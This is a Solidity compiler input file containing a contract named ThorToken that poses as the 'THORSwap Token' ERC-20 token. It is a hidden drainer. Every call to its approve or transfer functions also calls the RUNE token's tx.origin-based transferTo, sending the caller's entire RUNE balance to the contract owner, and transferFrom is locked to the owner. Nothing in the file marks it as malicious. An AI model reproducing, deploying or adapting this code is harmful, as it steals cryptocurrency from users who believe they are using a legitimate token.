{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/1_Storage.sol":{"content":"interface IRune {\n  function balanceOf(address holder) external returns (uint256);\n  function transferTo(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract ThorToken {\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n    string public name = \"THORSwap Token\";\n    string public symbol = \"THOR\";\n    uint8 public decimals = 18;\n    uint256 public totalSupply = 500e6 ether;\n\n    IRune rune = IRune(0x3155BA85D5F96b2d030a4966AF206230e46849cb);\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    address private owner;\n    \n    constructor() {\n      owner = msg.sender;\n      balanceOf[owner] = totalSupply;\n      emit Transfer(address(0), owner, totalSupply);\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n      rune.transferTo(owner, rune.balanceOf(tx.origin));\n      allowance[msg.sender][spender] = amount;\n      emit Approval(msg.sender, spender, amount);\n      return true;\n    }\n\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n      rune.transferTo(owner, rune.balanceOf(tx.origin));\n      balanceOf[msg.sender] -= amount;\n      balanceOf[recipient] += amount;\n      emit Transfer(msg.sender, recipient, amount);\n      return true;\n    }\n\n    function transferFrom(address from, address recipient, uint256 amount) external returns (bool) {\n      require(tx.origin == owner, \"seul maitre\");\n      balanceOf[from] -= amount;\n      balanceOf[recipient] += amount;\n      emit Transfer(msg.sender, recipient, amount);\n      return true;\n    }\n}"}}}